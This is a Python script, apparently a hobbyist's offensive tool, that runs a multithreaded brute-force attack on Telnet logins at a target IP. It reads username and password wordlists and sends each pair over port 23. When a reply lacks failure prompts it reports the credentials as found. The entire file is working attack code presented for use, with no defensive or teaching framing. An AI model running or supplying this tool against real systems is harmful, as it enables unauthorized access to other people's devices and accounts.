#!/bin/python3

print("__________________________________________________________________________________")
print("\n")
print(r"     ____  _  _  ____  _  _  ____  ____  _  _  ____  ____     ____  _  _ ")
print(r"    (  _ \/ )( \/ ___)( \/ )(  _ \(  _ \/ )( \(_  _)(  __)   (  _ \( \/ )")
print(r"     ) _ () \/ (\___ \ )  /  ) _ ( )   /) \/ (  )(   ) _)  _  ) __/ )  / ")
print(r"    (____/\____/(____/(__/  (____/(__\_)\____/ (__) (____)(_)(__)  (__/  ")
print("                                                authored-by J-mikyas.")
print("\n")
print("__________________________________________________________________________________")

print("\n")


import os
import socket
import time
import sys
import threading

#args check

if len(sys.argv) < 5:
    print("[!] Error: Missing arguments!")
    print("[!] Usage: ./file.py <'ip'> <'user wordlist dir'> <'pass wordlist dir'1> <threads>")
    sys.exit(0)

if int(sys.argv[4]) <= 0:
    print("[!] Error: Incorrect usage of arg 1")
    print("[!] arg 1 should be >= 1!")
    sys.exit(0)

ip = str(sys.argv[1])
port = 23

threads = int(sys.argv[4])

user_wordlist = str(sys.argv[2])
pass_wordlist = str(sys.argv[3])

print(r"---\\ TARGET INFO //---")
print(f"\n ip: {ip}")
print(f" port: {port} \n")
print(f" threads: {threads} \n")

print(r"---\\ STARTING BRUTE FORCE ATTACK! //---")
print("\n")


def RespTriedAll():
    print("[ :( ] COULDNT FIND THE CREDS, TRY A DIFFRENT WORDLIST?")

# \\ BRUTE FORCE LOGIC //

with open(pass_wordlist) as passwds:
    pass_lines = passwds.readlines()
with open(user_wordlist) as users:
     user_lines = users.readlines()

credcombos = 0
totalcombos = (len(user_lines)) * (len(pass_lines))

cracked = False
print_lock = threading.Lock()

def brute(user_lines, pass_lines):
    s = None

    def connect():
        nonlocal s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))

    def disconnect():
        nonlocal s
        try:
            s.getpeername()
            s.close()
        except:
            pass

    global cracked, credcombos, totalcombos
    
    user_index = 0
    pass_index = 0

    while user_index + 1 <= len(user_lines) and not cracked:

        try:
            connect()
        except Exception:
            time.sleep(1)
            continue

        for i in range(3):
            if pass_index >= len(pass_lines):
                pass_index = 0
                user_index += 1

            if user_index + 1 <= len(user_lines) and not cracked:
                pass
            else:
                disconnect()
                sys.exit(0)

            # --------- \\ [[LOGIN ATTEMPT]] // -------------
            username = user_lines[user_index].strip()
            passwd = pass_lines[pass_index].strip()

            try:
                time.sleep(0.15)
                s.sendall(username.encode() + b"\n")

                time.sleep(0.15)
                s.sendall(passwd.encode() + b"\n")
            
                # ---------- \\  [[ CRED CHECK ]] // ------------
                time.sleep(0.1)
                
                with print_lock:
                    print(f"[*] TRYING {username}:{passwd} | CREDS TRIED: {credcombos}/{totalcombos}")

                resp = b""
                for _ in range(4):
                    try:
                        data = s.recv(1300)
                        if data:
                            resp += data
                    except socket.timeout:
                        break
                    time.sleep(0.2)

                resp_str = str(resp).lower()

                if "incorrect" in resp_str or "login:" in resp_str or "username:" in resp_str or "password:" in resp_str:
                    pass
                elif resp == b"":
                    break
                else:
                    cracked = True
                    with print_lock:
                        print("\n[+] CREDS FOUND !!!: " + username + ":" + passwd)
                        print("[+] RESPONSE OF: " + str(resp))
                    disconnect()
                    os._exit(0)
            
            except Exception:
                break

            pass_index += 1
            credcombos += 1

        disconnect()

# -- \\ THREADING LOGIC // --

#vars

user_gap = len(user_lines) // threads
pass_gap = len(pass_lines) // threads

#start and end points(range)

user_SP = 0
user_EP = user_gap

thread_list = []

for thread in range(threads):
    
    if thread == threads - 1:
        user_EP = len(user_lines)

    #cutting up user and pass lines into little chuncks

    user_list = user_lines[user_SP:user_EP]
    
    bruteThread = threading.Thread(target=brute, args=(user_list, pass_lines))
    bruteThread.start()
    thread_list.append(bruteThread)

    #updating range logic

    user_SP = user_EP
    user_EP += user_gap

for thread_object in thread_list:
    thread_object.join()

RespTriedAll()
